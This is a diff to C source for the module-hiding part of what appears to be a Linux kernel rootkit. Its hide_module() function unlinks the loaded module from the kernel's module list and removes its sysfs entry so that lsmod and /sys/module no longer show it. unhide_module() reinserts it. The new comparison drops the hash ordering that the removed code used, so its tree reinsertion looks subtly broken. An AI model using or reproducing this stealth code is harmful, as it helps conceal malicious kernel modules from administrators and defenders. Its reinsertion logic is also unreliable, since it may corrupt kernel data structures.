@@ -7,81 +7,68 @@
 #include "common.h"
 #include "modhide.h"
 
-static struct list_head *mod_prev;
+static struct list_head *mod;
 
 void
 hide_module(void)
 {
-    struct kernfs_node *node;
+    struct kernfs_node *knode;
 
-    node = THIS_MODULE->mkobj.kobj.sd;
+    if (mod)
+        return;
 
-    mod_prev = THIS_MODULE->list.prev;
+    knode = THIS_MODULE->mkobj.kobj.sd;
+    mod = THIS_MODULE->list.prev;
 
     list_del(&THIS_MODULE->list);
-
-    rb_erase(&node->rb, &node->parent->dir.children);
-    node->rb.__rb_parent_color = (unsigned long)(&node->rb);
+    rb_erase(&knode->rb, &knode->parent->dir.children);
+    knode->rb.__rb_parent_color = (unsigned long)(&knode->rb);
 }
 
 void
 unhide_module(void)
 {
-    list_add(&THIS_MODULE->list, mod_prev);
-    rb_add(THIS_MODULE->mkobj.kobj.sd);
-}
+    int res;
+    struct kernfs_node *rb;
+    struct rb_root *root;
+    struct rb_node *parent;
+    struct rb_node **new;
 
-void
-rb_add(struct kernfs_node *node)
-{
-    struct rb_node **child = &node->parent->dir.children.rb_node;
-    struct rb_node *parent = NULL;
+    if (!mod)
+        return;
 
-    while(*child) {
-        struct kernfs_node *pos;
-        int result;
+    rb = THIS_MODULE->mkobj.kobj.sd;
+    root = &rb->parent->dir.children;
+    new = &root->rb_node;
+    parent = NULL;
 
-        /* cast rb_node to kernfs_node */
-        pos = rb_entry(*child, struct kernfs_node, rb);
+    list_add(&THIS_MODULE->list, mod);
 
-        /* 
-         * traverse the rbtree from root to leaf (until correct place found)
-         * next level down, child from previous level is now the parent
-         */
-        parent = *child;
+    { // insert our module back into the RB tree of modules
+        // search for the place to insert, insert, then rebalance tree,
+        // as per https://www.kernel.org/doc/Documentation/rbtree.txt
+        while (*new) {
+            static struct kernfs_node *new_rb;
 
-        /* using result to determine where to put the node */
-        result = nodecmp(pos, node->hash, node->name, node->ns);
+            parent = *new;
+            new_rb = rb_entry(*new, struct kernfs_node, rb);
 
-        if(result < 0)
-            child = &pos->rb.rb_left;
-        else if(result > 0)
-            child = &pos->rb.rb_right;
-        else
-            return;
+            // https://elixir.bootlin.com/linux/v4.19/source/include/linux/kernfs.h#L132
+            res = (new_rb->ns == rb->ns)
+                ? strcmp(rb->name, new_rb->name)
+                : (rb->ns - new_rb->ns);
+
+            if (res < 0)
+                new = &((*new)->rb_left);
+            else if (res > 0)
+                new = &((*new)->rb_right);
+            else
+                return;
+        }
+
+        rb_link_node(&rb->rb, parent, new);
+        rb_insert_color(&rb->rb, root);
     }
 
-    /* add new node and reblance the tree */
-    rb_link_node(&node->rb,parent, child);
-    rb_insert_color(&node->rb, &node->parent->dir.children);
-
-    /* needed for special cases */
-    if (kernfs_type(node) == KERNFS_DIR)
-        node->parent->dir.subdirs++;
-}
-
-
-int
-nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, const void *ns)
-{
-    /* compare hash value */
-    if(hash != kn->hash)
-        return hash - kn->hash;
-
-    /* compare ns */
-    if(ns != kn->ns)
-        return ns - kn->ns;
-
-    /* compare name */
-    return strcmp(name, kn->name);
+    mod = NULL;
 }
